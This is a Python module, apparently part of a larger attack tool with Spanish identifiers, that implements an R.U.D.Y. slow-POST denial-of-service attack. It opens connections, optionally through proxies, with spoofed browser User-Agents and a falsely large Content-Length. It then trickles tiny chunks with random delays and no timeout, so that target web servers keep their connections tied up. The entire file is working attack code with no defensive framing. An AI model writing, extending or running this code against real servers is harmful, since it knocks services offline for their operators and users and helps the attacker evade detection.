import asyncio
import random
import aiohttp
from aiohttp import ClientSession, ClientTimeout, ClientError

class Rudy:
    def __init__(self, motor):
        self.motor = motor
        
    async def ejecutar(self, proxy=None):
        sesion = None
        try:
            sesion = await self.motor.pool.obtener_conexion(
                self.motor.host,
                self.motor.puerto,
                self.motor.ssl,
                proxy
            )
            
            if not sesion:
                return
                
            cabeceras = {
                "User-Agent": random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
                ]),
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": str(random.randint(1024 * 1024, 1024 * 1024 * 10)),
                "Connection": "keep-alive",
                "Transfer-Encoding": "chunked"
            }
            
            url = f"{'https' if self.motor.ssl else 'http'}://{self.motor.host}:{self.motor.puerto}/"
            
            async with sesion.post(
                url,
                headers=cabeceras,
                data=self._generar_datos_lentos(),
                timeout=ClientTimeout(total=None)
            ) as respuesta:
                await respuesta.read()
                self.motor.estadisticas.agregar_exito(len(cabeceras))
                
        except (asyncio.CancelledError, ClientError, Exception):
            self.motor.estadisticas.agregar_error()
        finally:
            if sesion:
                await self.motor.pool.liberar_conexion(sesion)
            
    async def _generar_datos_lentos(self):
        total = random.randint(1024 * 1024, 1024 * 1024 * 5)
        enviados = 0
        while enviados < total:
            chunk = "0" * random.randint(1, 100)
            yield chunk
            enviados += len(chunk)
            await asyncio.sleep(random.uniform(0.1, 1.0))